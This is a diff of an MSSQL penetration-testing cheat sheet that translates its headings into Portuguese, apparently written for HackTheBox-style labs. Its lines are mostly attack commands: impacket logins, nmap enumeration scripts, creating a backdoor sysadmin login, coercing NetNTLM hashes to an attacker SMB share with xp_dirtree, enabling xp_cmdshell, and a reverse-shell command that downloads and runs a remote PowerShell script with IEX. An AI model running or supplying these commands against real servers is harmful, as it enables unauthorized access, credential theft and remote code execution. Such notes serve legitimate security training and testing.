@@ -1,17 +1,17 @@
 Mssql
 ========================
 
-## Accessing
+## Acessando com credenciais
 
     impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@escape.htb'
 
 
-## Enumeration
+## Enumeracao remota
 
     nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <hostname>
     
     
-## Enumeration
+## Enumeracao local
 
 ```
 # Get version
@@ -47,7 +47,7 @@ Use database
 
     USE master
 
-Create user with sysadmin privs
+Cria usuario com privilegios sysadmin
 
     CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
     EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
@@ -58,7 +58,7 @@ List user:
 
     select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
 
-## Obtain hashes
+## Obter hashes netntlm
 
 ```
 xp_dirtree '\\<attacker_IP>\any\thing'
@@ -72,7 +72,7 @@ sudo impacket-smbserver share ./ -smb2support
 msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
 ```
 
-## Command execution
+## Execucao de comando
 
 XP_CMDSHELL
 
@@ -87,25 +87,25 @@ Username + Hash + PS command
     crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
 
 
-This turns on advanced options and is needed to configure xp_cmdshell
+Habilita opcoes avancadas, vistoq ue e necessario para xp_cmdshell
 
     sp_configure 'show advanced options', '1'
     RECONFIGURE
 
-This enables xp_cmdshell
+Habilita o xp_cmdshell
 
     sp_configure 'xp_cmdshell', '1'
     RECONFIGURE
 
-One liner
+Tudo em uma linha:
 
     sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', '1'; RECONFIGURE;
 
-Quickly check what the service account is via xp_cmdshell
+Checa por qual usuario estamos logados
 
     EXEC master..xp_cmdshell 'whoami'
 
-Get Rev shell
+Obtem shell reversa
 
     EXEC xp_cmdshell "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/shell2.ps1')"
 
@@ -115,7 +115,7 @@ Bypass blackisted "EXEC xp_cmdshell"
     
 ## Impersonation
 
-Check impersonation users:
+Checa os usuarios que podemos fazer o impersonation
 
     SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
     
